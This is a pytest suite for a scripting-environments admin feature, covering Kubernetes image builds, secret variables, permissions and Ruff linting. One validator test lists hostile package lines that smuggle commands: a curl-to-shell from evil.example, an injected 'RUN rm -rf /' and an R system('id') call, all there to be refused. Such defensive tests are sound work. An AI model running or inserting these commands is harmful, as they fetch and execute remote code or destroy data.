"""Scripting environments (Admin → Scripting environments), docs/specs/script-node.md.

Fixed here:
- the panel: Kubernetes only, written by administrators only, never a secret in an
  answer or in the audit (the bucket's secret key, the secret variables);
- the reserved variable names;
- the packages checked before they reach a Dockerfile;
- a new version only when the language version or the packages change;
- an environment used by a flow cannot be deleted;
- the builds: queued → building (rootless BuildKit pushing to the registry) →
  checking (the image by digest, run as a script would be) → ready and current;
- any failure keeps the current version and says why;
- a cluster that does not answer only delays.
"""
import asyncio
import time
import json
from urllib.parse import parse_qs, urlsplit

import httpx
import pytest
from fastapi import FastAPI
from fastapi.testclient import TestClient
from sqlmodel import select

from app.core.config import get_settings
from app.core.crypto import decrypt_secret
from app.db.session import get_session
from app.models import AuditLog, Flow, ScriptEnvironment, ScriptEnvironmentVariable, ScriptEnvironmentVersion, ScriptStorage
from app.routes import scripting as routes
from app.services import kube_jobs, script_builds
from tests.conftest import make_user

CSRF = {"X-Tabularia-Csrf": "1"}
PASSWORD = "una-password-lunga"
SECRET = "the-bucket-s3cret"
DIGEST = "sha256:" + "ab" * 32


class Cluster:
    """The Kubernetes API for Jobs, their Pods and logs. A Job's outcome and log are
    set by the test (`finish`); `fail_with` makes every call answer that status,
    `fail_creates` the next creations of a Job."""

    def __init__(self):
        self.jobs: dict[tuple[str, str], dict] = {}
        self.logs: dict[str, str] = {}
        self.calls: list[tuple[str, str]] = []
        self.fail_with = 0
        self.fail_creates = 0
        self.waiting: dict[str, dict] = {}  # job name → its Pod's waiting state

    def finish(self, name: str, ok: bool, log: str = "", reason: str = "BackoffLimitExceeded"):
        job = next(j for (ns, n), j in self.jobs.items() if n == name)
        cond = {"type": "Complete", "status": "True"} if ok else {"type": "Failed", "status": "True", "reason": reason,
                                                                  "message": "Job has reached the specified backoff limit"}
        job["status"] = {"conditions": [cond], **({"succeeded": 1} if ok else {"failed": 1})}
        self.logs[name] = log

    def job(self, name: str) -> dict:
        return next(j for (ns, n), j in self.jobs.items() if n == name)

    def handle(self, req: httpx.Request) -> httpx.Response:
        self.calls.append((req.method, req.url.path))
        assert req.headers["Authorization"] == "Bearer sa-token"
        if self.fail_with:
            return httpx.Response(self.fail_with, json={"message": "etcdserver: request timed out"})
        parts = req.url.path.strip("/").split("/")
        query = parse_qs(urlsplit(str(req.url)).query)
        if parts[:2] == ["apis", "batch"]:
            ns = parts[4]
            if req.method == "POST":
                if self.fail_creates:
                    self.fail_creates -= 1
                    return httpx.Response(503, json={"message": "etcdserver: request timed out"})
                body = json.loads(req.content)
                key = (ns, body["metadata"]["name"])
                if key in self.jobs:
                    return httpx.Response(409, json={"message": "already exists"})
                self.jobs[key] = {**body, "status": {}}
                return httpx.Response(201, json=body)
            if len(parts) == 7:
                key = (ns, parts[6])
                if req.method == "GET":
                    return httpx.Response(200, json=self.jobs[key]) if key in self.jobs else httpx.Response(404, json={"message": "not found"})
                if req.method == "DELETE":
                    return httpx.Response(200, json={}) if self.jobs.pop(key, None) else httpx.Response(404, json={"message": "not found"})
            if req.method == "DELETE":  # by label
                label, value = query["labelSelector"][0].split("=")
                for key in [k for k, j in self.jobs.items() if k[0] == ns and j["metadata"]["labels"].get(label) == value]:
                    del self.jobs[key]
                return httpx.Response(200, json={})
        if parts[:2] == ["api", "v1"] and parts[4] == "pods":
            if len(parts) == 5:
                name = query["labelSelector"][0].split("=", 1)[1]
                pod = {"metadata": {"name": f"{name}-x1", "creationTimestamp": "2026-10-20T10:00:00Z"}}
                if name in self.waiting:
                    pod["status"] = {"containerStatuses": [{"state": {"waiting": self.waiting[name]}}]}
                return httpx.Response(200, json={"items": [pod]})
            return httpx.Response(200, text=self.logs.get(parts[5].removesuffix("-x1"), ""))
        return httpx.Response(404, json={"message": f"not mocked: {req.url.path}"})


@pytest.fixture
def cluster(monkeypatch, tmp_path):
    c = Cluster()
    (tmp_path / "token").write_text("sa-token\n")
    for k, v in {"KUBERNETES__TOKEN_FILE": str(tmp_path / "token"), "KUBERNETES__CA_FILE": "",
                 "SCRIPTS__ENABLED": "true", "SCRIPTS__NAMESPACE": "tab-scripts",
                 "SCRIPTS__BUILD_NAMESPACE": "tab-builds", "SCRIPTS__REGISTRY": "registry.example.com/tabularia",
                 "SCRIPTS__REGISTRY_PUSH_SECRET": "registry-push", "SCRIPTS__REGISTRY_PULL_SECRET": "registry-pull"}.items():
        monkeypatch.setenv(k, v)
    get_settings.cache_clear()
    monkeypatch.setattr(kube_jobs, "_transport", httpx.MockTransport(c.handle))
    yield c
    get_settings.cache_clear()


class Engine:
    def __init__(self):
        self.bodies: list[dict] = []
        self.answer = {"ok": True, "message": "Wrote, read and deleted", "can_list": False}

    def handle(self, req: httpx.Request) -> httpx.Response:
        assert req.url.path == "/scripts/storage/test"
        self.bodies.append(json.loads(req.content))
        return httpx.Response(200, json=self.answer)


@pytest.fixture
def engine(monkeypatch):
    e = Engine()
    monkeypatch.setattr("app.core.engine_client._client",
                        httpx.AsyncClient(transport=httpx.MockTransport(e.handle), base_url="http://engine"))
    return e


@pytest.fixture
def app(session, engine):
    from app.routes import api_tokens as tokens_routes
    from app.routes import auth as auth_routes

    app = FastAPI()
    for r in (auth_routes.router, tokens_routes.router, routes.router, routes.editor_router):
        app.include_router(r)
    app.dependency_overrides[get_session] = lambda: session
    return app


def _login(app, session, email, **kw) -> TestClient:
    from app.core.security import hash_password

    make_user(session, email=email, hashed_password=hash_password(PASSWORD), **kw)
    c = TestClient(app)
    assert c.post("/auth/login", json={"email": email, "password": PASSWORD}, headers=CSRF).status_code == 200
    return c


def _audit(session, action):
    return session.exec(select(AuditLog).where(AuditLog.action == action)).all()


def _create(c, **kw):
    body = {"name": "Models", "language": "python", "language_version": "3.12", "packages": "scikit-learn==1.5.2", **kw}
    return c.post("/admin/scripting/environments", json=body, headers=CSRF)


def _round(session):
    changed = asyncio.run(script_builds.un_giro(session.get_bind()))
    session.expire_all()  # the round wrote with a session of its own
    return changed


# ── the panel ────────────────────────────────────────────────────────────────
def test_without_kubernetes_the_section_says_why_and_saves_nothing(app, session):
    boss = _login(app, session, "boss@x.local", is_superuser=True)
    state = boss.get("/admin/scripting").json()
    assert state["disabled_reason"] == "kubernetes" and state["environments"] == []
    assert set(state["languages"]) == {"python", "r"}
    r = _create(boss)
    assert r.status_code == 409 and "Kubernetes" in r.json()["detail"]


def test_the_bucket_key_is_written_and_never_read_back(app, session, cluster, engine):
    boss = _login(app, session, "boss@x.local", is_superuser=True)
    r = boss.put("/admin/scripting/storage", json={"endpoint": "http://minio:9000", "bucket": "scripts",
                                                   "access_key": "scripts-key", "secret_key": SECRET}, headers=CSRF)
    assert r.status_code == 200, r.text
    assert r.json()["secret_key_set"] is True and SECRET not in r.text
    row = session.get(ScriptStorage, 1)
    assert decrypt_secret(row.secret_key_enc) == SECRET
    entry = _audit(session, "scripting.storage_update")[0]
    assert json.loads(entry.detail)["changes"]["secret_key"] == "changed" and SECRET not in entry.detail
    # the check runs on the engine, with the secret still encrypted
    out = boss.post("/admin/scripting/storage/test", headers=CSRF).json()
    assert out == {"ok": True, "message": "Wrote, read and deleted", "can_list": False}
    sent = engine.bodies[0]["connection"]
    assert sent["bucket"] == "scripts" and sent["secret_key_encrypted"] == row.secret_key_enc and SECRET not in json.dumps(sent)
    assert boss.put("/admin/scripting/storage", json={"endpoint": "minio:9000"}, headers=CSRF).status_code == 422


def test_an_observer_reads_and_changes_nothing(app, session, cluster):
    boss = _login(app, session, "boss@x.local", is_superuser=True)
    env = _create(boss).json()
    boss.put(f"/admin/scripting/environments/{env['id']}/variables/DB_PASSWORD",
             json={"value": "pw-s3cret", "secret": True}, headers=CSRF)
    eye = _login(app, session, "eye@x.local", is_observer=True)
    state = eye.get("/admin/scripting").json()
    assert state["editable"] is False and [e["name"] for e in state["environments"]] == ["Models"]
    detail = eye.get(f"/admin/scripting/environments/{env['id']}")
    assert detail.status_code == 200 and "pw-s3cret" not in detail.text
    assert _create(eye, name="Other").status_code == 403
    assert eye.put("/admin/scripting/storage", json={"bucket": "x"}, headers=CSRF).status_code == 403


def test_creating_an_environment_queues_its_first_build(app, session, cluster):
    boss = _login(app, session, "boss@x.local", is_superuser=True)
    r = _create(boss, description="scoring", group_ids=[])
    assert r.status_code == 201, r.text
    env = r.json()
    assert env["language_version"] == "3.12" and env["latest_status"] == "queued" and env["current_number"] is None
    assert [v["number"] for v in env["versions"]] == [1] and env["versions"][0]["base_image"] == "python:3.12-slim"
    assert _create(boss, name="models").status_code == 409  # names differ in more than case
    assert _create(boss, name="X", language_version="2.7").status_code == 422
    assert _create(boss, name="X", language="julia").status_code == 422
    assert _create(boss, name="X", cpu_limit="two").status_code == 422


@pytest.mark.parametrize("language, line", [
    ("python", "requests; curl evil.example | sh"),
    ("python", "pandas\nRUN rm -rf /"),
    ("python", "TABULARIA_PACKAGES"),
    ("r", "dplyr; system('id')"),
    ("r", "dplyr@latest"),
])
def test_a_line_that_is_not_a_package_is_refused_with_its_number(app, session, cluster, language, line):
    boss = _login(app, session, "boss@x.local", is_superuser=True)
    version = "3.12" if language == "python" else "4.5"
    r = _create(boss, language=language, language_version=version, packages=f"# comment\n\n{line}")
    assert r.status_code == 422
    detail = r.json()["detail"]
    assert detail["code"] == "package" and detail["line"] >= 3


def test_only_the_language_version_and_the_packages_make_a_new_version(app, session, cluster):
    boss = _login(app, session, "boss@x.local", is_superuser=True)
    env = _create(boss).json()
    url = f"/admin/scripting/environments/{env['id']}"
    out = boss.put(url, json={"description": "new words", "memory_limit": "8Gi", "max_timeout_seconds": 7200},
                   headers=CSRF).json()
    assert [v["number"] for v in out["versions"]] == [1] and out["memory_limit"] == "8Gi"
    out = boss.put(url, json={"packages": "scikit-learn==1.5.2\nxgboost==2.1.1"}, headers=CSRF).json()
    assert [v["number"] for v in out["versions"]] == [2, 1] and out["packages"].endswith("xgboost==2.1.1")
    out = boss.put(url, json={"language_version": "3.13"}, headers=CSRF).json()
    assert out["versions"][0]["number"] == 3 and out["versions"][0]["base_image"] == "python:3.13-slim"
    assert boss.post(f"{url}/rebuild", headers=CSRF).status_code == 409  # version 3 is still queued


def test_variables_reserved_names_and_secrets(app, session, cluster):
    boss = _login(app, session, "boss@x.local", is_superuser=True)
    env = _create(boss).json()
    base = f"/admin/scripting/environments/{env['id']}/variables"
    for bad in ("TABULARIA_INPUT", "AWS_ACCESS_KEY_ID", "lower_case", "1ST"):
        assert boss.put(f"{base}/{bad}", json={"value": "x"}, headers=CSRF).status_code == 422, bad
    out = boss.put(f"{base}/THRESHOLD", json={"value": "100"}, headers=CSRF).json()
    out = boss.put(f"{base}/API_KEY", json={"value": "k-s3cret", "secret": True}, headers=CSRF).json()
    by_name = {v["name"]: v for v in out["variable_list"]}
    assert by_name["THRESHOLD"]["value"] == "100" and by_name["API_KEY"] == {**by_name["API_KEY"], "value": None, "secret": True}
    row = session.exec(select(ScriptEnvironmentVariable).where(ScriptEnvironmentVariable.name == "API_KEY")).one()
    assert row.value == "" and decrypt_secret(row.value_enc) == "k-s3cret"
    # a secret keeps its value when only the flags are sent again
    assert boss.put(f"{base}/API_KEY", json={"secret": True}, headers=CSRF).status_code == 200
    assert decrypt_secret(session.get(ScriptEnvironmentVariable, row.id).value_enc) == "k-s3cret"
    assert boss.put(f"{base}/NEW_ONE", json={"secret": True}, headers=CSRF).status_code == 422
    # the marked exception: a Tabularia variable handed over by name
    assert boss.put(f"{base}/CH_PASSWORD", json={"value": "not a name", "from_tabularia": True}, headers=CSRF).status_code == 422
    out = boss.put(f"{base}/CH_PASSWORD", json={"value": "CLICKHOUSE_EXTERNAL__PASSWORD", "from_tabularia": True},
                   headers=CSRF).json()
    assert {v["name"]: v for v in out["variable_list"]}["CH_PASSWORD"]["from_tabularia"] is True
    details = " ".join(e.detail for e in _audit(session, "scripting.variable_set"))
    assert "k-s3cret" not in details and "CLICKHOUSE_EXTERNAL__PASSWORD" in details
    out = boss.delete(f"{base}/THRESHOLD", headers=CSRF).json()
    assert "THRESHOLD" not in {v["name"] for v in out["variable_list"]}


def test_an_environment_used_by_a_flow_is_not_deleted(app, session, cluster):
    boss = _login(app, session, "boss@x.local", is_superuser=True)
    env = _create(boss).json()
    flow = Flow(name="Scoring", project_id=1, definition=json.dumps({"nodes": [
        {"id": "s1", "type": "script", "data": {"environmentId": env["id"], "code": "print(1)"}}], "edges": []}))
    session.add(flow)
    session.commit()
    r = boss.delete(f"/admin/scripting/environments/{env['id']}", headers=CSRF)
    assert r.status_code == 409 and r.json()["detail"] == {"code": "in_use", "flows": ["Scoring"]}
    session.delete(flow)
    session.commit()
    _round(session)  # its build has started
    assert cluster.jobs
    assert boss.delete(f"/admin/scripting/environments/{env['id']}", headers=CSRF).status_code == 204
    assert cluster.jobs == {}  # the build is stopped
    assert session.exec(select(ScriptEnvironmentVersion)).all() == [] and _audit(session, "scripting.environment_delete")


# ── the builds ───────────────────────────────────────────────────────────────
def test_a_build_goes_from_queued_to_ready_and_current(app, session, cluster):
    boss = _login(app, session, "boss@x.local", is_superuser=True)
    env = _create(boss, packages="scikit-learn==1.5.2").json()
    _round(session)
    build = cluster.job("tabularia-build-e1-v1")
    assert ("tab-builds", "tabularia-build-e1-v1") in cluster.jobs
    pod = build["spec"]["template"]["spec"]
    container = pod["containers"][0]
    assert container["image"] == "moby/buildkit:v0.33.1-rootless" and pod["automountServiceAccountToken"] is False
    assert "name=registry.example.com/tabularia/tabularia-env-1:v1,push=true" in container["command"][2]
    # the manifest's digest, not the config's (both are in BuildKit's metadata file)
    assert '"containerimage.digest"' in container["command"][2]
    dockerfile = next(e["value"] for e in container["env"] if e["name"] == "TABULARIA_DOCKERFILE")
    assert dockerfile.startswith("FROM python:3.12-slim\n")
    assert "polars\npyarrow\nscikit-learn==1.5.2\nTABULARIA_PACKAGES\n" in dockerfile and "USER 10001" in dockerfile
    assert {"secretName": "registry-push", "items": [{"key": ".dockerconfigjson", "path": "config.json"}]} in \
        [v.get("secret") for v in pod["volumes"]]
    assert build["spec"]["backoffLimit"] == 0 and build["spec"]["activeDeadlineSeconds"] == 3600
    # the build's own resources: its memory requested whole, so it lands only where it fits
    assert container["resources"] == {"requests": {"cpu": "1", "memory": "4Gi"}, "limits": {"cpu": "2", "memory": "4Gi"}}
    assert "RUN MAKEFLAGS=-j2 pip install" in dockerfile
    assert session.exec(select(ScriptEnvironmentVersion)).one().status == "building"

    _round(session)  # still running: nothing moves
    assert session.exec(select(ScriptEnvironmentVersion)).one().status == "building"

    cluster.finish("tabularia-build-e1-v1", True, f"#12 pushing layers done\n\n{script_builds.DIGEST_MARK}{DIGEST}\n")
    _round(session)
    v = session.exec(select(ScriptEnvironmentVersion)).one()
    assert v.status == "checking" and v.image_ref == f"registry.example.com/tabularia/tabularia-env-1@{DIGEST}"
    assert script_builds.DIGEST_MARK not in v.build_log and "pushing layers" in v.build_log
    assert ("tab-builds", "tabularia-build-e1-v1") not in cluster.jobs
    check = cluster.job("tabularia-check-e1-v1")
    pod = check["spec"]["template"]["spec"]
    container = pod["containers"][0]
    assert ("tab-scripts", "tabularia-check-e1-v1") in cluster.jobs and container["image"] == v.image_ref
    assert pod["securityContext"]["runAsNonRoot"] is True and container["securityContext"]["readOnlyRootFilesystem"] is True
    assert pod["imagePullSecrets"] == [{"name": "registry-pull"}] and container["command"][:2] == ["python", "-c"]
    assert container["resources"]["limits"] == {"cpu": "2", "memory": "4Gi"}

    cluster.finish("tabularia-check-e1-v1", True, "numpy==2.1.0\npolars==1.9.0\nscikit-learn==1.5.2\n")
    _round(session)
    session.expire_all()
    v = session.exec(select(ScriptEnvironmentVersion)).one()
    assert v.status == "ready" and v.lock.splitlines() == ["numpy==2.1.0", "polars==1.9.0", "scikit-learn==1.5.2"]
    assert session.get(ScriptEnvironment, env["id"]).current_version_id == v.id and cluster.jobs == {}
    state = boss.get(f"/admin/scripting/environments/{env['id']}").json()
    assert state["current_number"] == 1 and state["versions"][0]["current"] is True


def _ready(session, cluster, number):
    _round(session)
    cluster.finish(f"tabularia-build-e1-v{number}", True, f"{script_builds.DIGEST_MARK}{DIGEST}")
    _round(session)
    cluster.finish(f"tabularia-check-e1-v{number}", True, "polars==1.9.0")
    _round(session)


def test_a_failed_build_keeps_the_current_version_and_says_why(app, session, cluster):
    boss = _login(app, session, "boss@x.local", is_superuser=True)
    env = _create(boss).json()
    _ready(session, cluster, 1)
    url = f"/admin/scripting/environments/{env['id']}"
    boss.put(url, json={"packages": "no-such-package==9.9"}, headers=CSRF)
    _round(session)
    cluster.finish("tabularia-build-e1-v2", False, "ERROR: No matching distribution found for no-such-package==9.9")
    _round(session)
    state = boss.get(url).json()
    v2 = state["versions"][0]
    assert v2["status"] == "failed" and "No matching distribution" in v2["build_log"] and "BackoffLimitExceeded" in v2["error"]
    assert state["current_number"] == 1
    # a failed version cannot become current; rebuilding makes version 3
    assert boss.post(f"{url}/versions/{v2['id']}/current", headers=CSRF).status_code == 409
    assert boss.post(f"{url}/rebuild", headers=CSRF).json()["versions"][0]["number"] == 3


def test_an_image_that_does_not_start_fails_at_the_check(app, session, cluster):
    boss = _login(app, session, "boss@x.local", is_superuser=True)
    _create(boss, language="r", language_version="4.5", packages="dplyr\ndata.table@1.16.0")
    _round(session)
    dockerfile = next(e["value"] for e in cluster.job("tabularia-build-e1-v1")["spec"]["template"]["spec"]["containers"][0]["env"]
                      if e["name"] == "TABULARIA_DOCKERFILE")
    assert dockerfile.startswith("FROM rocker/r-ver:4.5.3\n") and "arrow\ndplyr\ndata.table@1.16.0\n" in dockerfile
    # at most 2 compilers at once (4Gi, 2 cores), never the node's cores
    assert "RUN TABULARIA_JOBS=2 Rscript /opt/tabularia/install.R" in dockerfile and "remotes::install_version" in dockerfile
    assert "detectCores" not in dockerfile
    cluster.finish("tabularia-build-e1-v1", True, f"{script_builds.DIGEST_MARK}{DIGEST}")
    _round(session)
    assert cluster.job("tabularia-check-e1-v1")["spec"]["template"]["spec"]["containers"][0]["command"][:2] == ["Rscript", "-e"]
    cluster.finish("tabularia-check-e1-v1", False, "Error: the arrow package of this image has no S3 support",
                   reason="BackoffLimitExceeded")
    _round(session)
    v = session.exec(select(ScriptEnvironmentVersion)).one()
    assert v.status == "failed" and "does not start" in v.error and "no S3 support" in v.error


def test_a_build_without_digest_or_a_vanished_job_fails(app, session, cluster):
    boss = _login(app, session, "boss@x.local", is_superuser=True)
    _create(boss)
    _round(session)
    cluster.finish("tabularia-build-e1-v1", True, "done, but no mark")
    _round(session)
    assert "digest" in session.exec(select(ScriptEnvironmentVersion)).one().error
    boss.post("/admin/scripting/environments/1/rebuild", headers=CSRF)
    _round(session)
    cluster.jobs.clear()  # someone deleted it by hand
    _round(session)
    v2 = session.exec(select(ScriptEnvironmentVersion).where(ScriptEnvironmentVersion.number == 2)).one()
    assert v2.status == "failed" and "is no longer in the cluster" in v2.error


def test_a_cluster_that_does_not_answer_only_delays(app, session, cluster):
    boss = _login(app, session, "boss@x.local", is_superuser=True)
    _create(boss)
    cluster.fail_with = 503
    assert _round(session) == 0
    assert session.exec(select(ScriptEnvironmentVersion)).one().status == "queued"
    cluster.fail_with = 0
    _round(session)
    assert session.exec(select(ScriptEnvironmentVersion)).one().status == "building"


def test_a_cluster_that_fails_between_build_and_check_only_delays(app, session, cluster):
    """The build succeeded, the check's Job cannot be created this round: the build's
    Job stays, and the next round goes on from it instead of failing the version."""
    boss = _login(app, session, "boss@x.local", is_superuser=True)
    _create(boss)
    _round(session)
    cluster.finish("tabularia-build-e1-v1", True, f"{script_builds.DIGEST_MARK}{DIGEST}\n")
    cluster.fail_creates = 1
    _round(session)
    assert session.exec(select(ScriptEnvironmentVersion)).one().status == "building"
    assert ("tab-builds", "tabularia-build-e1-v1") in cluster.jobs
    _round(session)
    v = session.exec(select(ScriptEnvironmentVersion)).one()
    assert v.status == "checking" and v.error is None
    assert ("tab-builds", "tabularia-build-e1-v1") not in cluster.jobs and ("tab-scripts", "tabularia-check-e1-v1") in cluster.jobs


def test_a_newer_ready_version_becomes_current_an_older_one_does_not(app, session, cluster):
    boss = _login(app, session, "boss@x.local", is_superuser=True)
    env = _create(boss).json()
    url = f"/admin/scripting/environments/{env['id']}"
    _ready(session, cluster, 1)
    boss.put(url, json={"packages": "xgboost==2.1.1"}, headers=CSRF)
    _ready(session, cluster, 2)
    state = boss.get(url).json()
    assert state["current_number"] == 2
    v1 = next(v for v in state["versions"] if v["number"] == 1)
    state = boss.post(f"{url}/versions/{v1['id']}/current", headers=CSRF).json()
    assert state["current_number"] == 1
    assert json.loads(_audit(session, "scripting.version_current")[0].detail) == {"from": 2, "to": 1}


# ── what the flow editor sees ────────────────────────────────────────────────
def test_the_editor_lists_only_the_environments_one_may_use(app, session, cluster):
    from app.models import Group, ScriptEnvironment, ScriptEnvironmentVersion, User, UserGroupLink

    boss = _login(app, session, "boss@x.local", is_superuser=True)
    g = Group(name="data science")
    session.add(g)
    session.commit()
    gid = g.id
    shared = _create(boss, name="Shared", group_ids=[gid]).json()
    _create(boss, name="Admins only")
    boss.put(f"/admin/scripting/environments/{shared['id']}/variables/API_KEY", json={"value": "k-s3cret", "secret": True},
             headers=CSRF)
    boss.put(f"/admin/scripting/environments/{shared['id']}/variables/THRESHOLD", json={"value": "100"}, headers=CSRF)
    v = session.exec(select(ScriptEnvironmentVersion).where(ScriptEnvironmentVersion.environment_id == shared["id"])).one()
    v.status, v.lock, v.completions = "ready", "polars==2.0.0\npyarrow==26.0.0", json.dumps({"polars": ["scan_parquet"]})
    env = session.get(ScriptEnvironment, shared["id"])
    env.current_version_id = v.id
    session.add_all([v, env])
    session.commit()

    analyst = _login(app, session, "ana@x.local")
    assert analyst.get("/scripting").json()["environments"] == []
    ana = session.exec(select(User).where(User.email == "ana@x.local")).one()
    session.add(UserGroupLink(user_id=ana.id, group_id=gid))
    session.commit()
    state = analyst.get("/scripting").json()
    assert [e["name"] for e in state["environments"]] == ["Shared"]
    e = state["environments"][0]
    assert e["ready"] is True and e["packages"] == ["polars==2.0.0", "pyarrow==26.0.0"]
    assert {v["name"]: v["value"] for v in e["variables"]} == {"API_KEY": None, "THRESHOLD": "100"}
    assert "k-s3cret" not in json.dumps(state) and "TABULARIA_INPUT" in state["tabularia_variables"]
    assert analyst.get(f"/scripting/environments/{shared['id']}/completions").json() == {"polars": ["scan_parquet"]}
    admins_only = next(x for x in boss.get("/admin/scripting").json()["environments"] if x["name"] == "Admins only")
    assert analyst.get(f"/scripting/environments/{admins_only['id']}/completions").status_code == 403


def test_the_check_output_splits_the_lock_from_the_completions():
    log = ("numpy==2.5.4\nsome import printed this\npolars==2.0.0\n"
           f'{script_builds.COMPLETIONS_MARK}{{"polars": ["scan_parquet", "col"]}}\n')
    lock, completions = script_builds.split_check_output(log)
    assert lock == "numpy==2.5.4\npolars==2.0.0" and json.loads(completions) == {"polars": ["scan_parquet", "col"]}
    assert script_builds.split_check_output("arrow@25.0.1\nglue@1.8.0\n") == ("arrow@25.0.1\nglue@1.8.0", None)


# ── Ruff in the code editor ──────────────────────────────────────────────────
def _ready_python(session, env_id, language_version="3.12"):
    v = session.exec(select(ScriptEnvironmentVersion).where(ScriptEnvironmentVersion.environment_id == env_id)).one()
    v.status, v.language_version = "ready", language_version
    env = session.get(ScriptEnvironment, env_id)
    env.current_version_id = v.id
    session.add_all([v, env])
    session.commit()


def test_the_editor_underlines_what_ruff_finds(app, session, cluster):
    from app.services import script_lint

    script_lint._recent.clear()
    boss = _login(app, session, "boss@x.local", is_superuser=True)
    env = _create(boss).json()
    _ready_python(session, env["id"])
    assert boss.get("/scripting").json()["lint"] is True
    code = "import polars as pl\nimport json\n\n\ndef read_input() -> pl.DataFrame:\n    return pl.read_parquet(os.environ[\"TABULARIA_INPUT\"])\n"
    r = boss.post("/scripting/lint", json={"environment_id": env["id"], "path": "lib/utils.py", "content": code}, headers=CSRF)
    assert r.status_code == 200 and r.json()["skipped"] is False
    found = {d["code"]: d for d in r.json()["diagnostics"]}
    # the name never imported stops the script: an error, on its line and columns
    assert found["F821"]["severity"] == "error" and "`os`" in found["F821"]["message"]
    assert (found["F821"]["line"], found["F821"]["column"], found["F821"]["end_column"]) == (6, 28, 30)
    # an import left unused does not: a warning
    assert found["F401"]["severity"] == "warning" and found["F401"]["line"] == 2
    time.sleep(1.1)
    broken = boss.post("/scripting/lint", json={"environment_id": env["id"], "path": "main.py", "content": "def f(:\n  pass\n"},
                       headers=CSRF).json()["diagnostics"]
    assert broken and broken[0]["code"] == "invalid-syntax" and broken[0]["severity"] == "error" and broken[0]["line"] == 1
    clean = boss.post("/scripting/lint", json={"environment_id": env["id"], "path": "main.py", "content": "import os\n\nprint(os.sep)\n"},
                      headers=CSRF).json()
    assert clean == {"diagnostics": [], "skipped": False}


def test_ruff_knows_the_environment_s_python(app, session, cluster):
    from app.services import script_lint

    script_lint._recent.clear()
    boss = _login(app, session, "boss@x.local", is_superuser=True)
    env = _create(boss).json()
    # `except*` exists from Python 3.11: Ruff checks for the version of the environment
    code = "try:\n    pass\nexcept* ValueError:\n    pass\n"
    _ready_python(session, env["id"], "3.11")
    ok = boss.post("/scripting/lint", json={"environment_id": env["id"], "path": "main.py", "content": code}, headers=CSRF)
    assert ok.json()["diagnostics"] == []
    assert script_lint.lint_python("main.py", code, "3.10") != []


def test_checks_beyond_the_rate_are_skipped_not_queued(app, session, cluster):
    from app.services import script_lint

    script_lint._recent.clear()
    boss = _login(app, session, "boss@x.local", is_superuser=True)
    env = _create(boss).json()
    _ready_python(session, env["id"])
    answers = [boss.post("/scripting/lint", json={"environment_id": env["id"], "path": "main.py", "content": f"x = {i}\n"},
                         headers=CSRF).json() for i in range(script_lint.RATE + 1)]
    assert [a["skipped"] for a in answers] == [False] * script_lint.RATE + [True]


def test_ruff_only_for_who_may_write_python_and_when_it_is_on(app, session, cluster, monkeypatch):
    from app.services import script_lint

    script_lint._recent.clear()
    boss = _login(app, session, "boss@x.local", is_superuser=True)
    env = _create(boss).json()
    _ready_python(session, env["id"])
    r_env = _create(boss, name="Reports", language="r", language_version="4.5", packages="").json()
    body = {"environment_id": env["id"], "path": "main.py", "content": "print(os)\n"}
    analyst = _login(app, session, "ana@x.local")
    assert analyst.post("/scripting/lint", json=body, headers=CSRF).status_code == 403
    assert boss.post("/scripting/lint", json={**body, "content": "#" * (300 * 1024)}, headers=CSRF).status_code == 413
    assert boss.post("/scripting/lint", json={**body, "environment_id": r_env["id"], "path": "main.R"},
                     headers=CSRF).json()["diagnostics"] == []
    monkeypatch.setenv("SCRIPTS__LINT", "false")
    get_settings.cache_clear()
    assert boss.get("/scripting").json()["lint"] is False
    assert boss.post("/scripting/lint", json=body, headers=CSRF).json()["diagnostics"] == []


def test_ruff_that_cannot_run_shows_nothing(monkeypatch):
    from app.services import script_lint

    monkeypatch.setattr(script_lint, "_ruff", lambda: "/nonexistent/ruff")
    assert script_lint.lint_python("main.py", "print(undefined_here)\n# a content not cached\n", "3.12") == []


def test_an_import_the_environment_does_not_have_is_underlined(app, session, cluster):
    from app.services import script_lint

    script_lint._recent.clear()
    boss = _login(app, session, "boss@x.local", is_superuser=True)
    env = _create(boss).json()
    _ready_python(session, env["id"])
    code = ("import os, json\n"
            "import polars as pl\n"
            "import sklearn.linear_model\n"
            "import marameo\n"
            "from pandas import DataFrame\n"
            "from utils import read_input\n"
            "from lib.scoring import score\n"
            "from . import sibling\n"
            "print(os, json, pl, sklearn, marameo, DataFrame, read_input, score, sibling)\n")
    body = {"environment_id": env["id"], "path": "main.py", "content": code, "files": ["main.py", "utils.py", "lib/scoring.py"]}
    # a version checked before the list of modules existed: nothing said about imports
    assert [d for d in boss.post("/scripting/lint", json=body, headers=CSRF).json()["diagnostics"]
            if d["code"] == "not-installed"] == []
    v = session.exec(select(ScriptEnvironmentVersion).where(ScriptEnvironmentVersion.environment_id == env["id"])).one()
    # what the build's check lists: every module installed, also one it could not import (no names)
    v.completions = json.dumps({"polars": ["scan_parquet"], "sklearn": [], "pyarrow": []})
    session.add(v)
    session.commit()
    time.sleep(1.1)
    found = [d for d in boss.post("/scripting/lint", json=body, headers=CSRF).json()["diagnostics"] if d["code"] == "not-installed"]
    assert [(d["line"], d["column"], d["end_column"], d["severity"]) for d in found] == [(4, 8, 15, "error"), (5, 6, 12, "error")]
    assert found[0]["message"] == "`marameo` is not installed in the environment «Models»"


def test_the_build_check_lists_every_installed_module():
    # a module that does not import within the check is still listed, with no names
    assert "api[mod] = []" in script_builds.check_command("python")[2]



@pytest.mark.parametrize("cpu, memory, jobs", [
    ("2", "4Gi", 2),        # the defaults
    ("8", "6Gi", 4),        # the memory decides: one compiler per 1.5 GiB
    ("1", "16Gi", 1),       # the cores decide
    ("500m", "4Gi", 1),     # never fewer than one
    ("16", "12884901888", 8),  # bytes
    ("4", "6144Mi", 4),
])
def test_a_build_runs_as_many_compilers_as_its_limits_allow(monkeypatch, cpu, memory, jobs):
    monkeypatch.setenv("SCRIPTS__BUILD_CPU", cpu)
    monkeypatch.setenv("SCRIPTS__BUILD_MEMORY", memory)
    get_settings.cache_clear()
    try:
        assert script_builds.build_jobs() == jobs
        assert f"RUN TABULARIA_JOBS={jobs} Rscript" in script_builds.dockerfile("r", "rocker/r-ver:4.5.3", ["forecast"])
    finally:
        get_settings.cache_clear()


@pytest.mark.parametrize("name, value", [("SCRIPTS__BUILD_CPU", "two"), ("SCRIPTS__BUILD_CPU", "0"),
                                         ("SCRIPTS__BUILD_MEMORY", "4 GB"), ("SCRIPTS__BUILD_MEMORY", "lots")])
def test_build_resources_that_are_not_quantities_are_refused(monkeypatch, name, value):
    monkeypatch.setenv(name, value)
    get_settings.cache_clear()
    try:
        with pytest.raises(Exception, match=name):
            get_settings()
    finally:
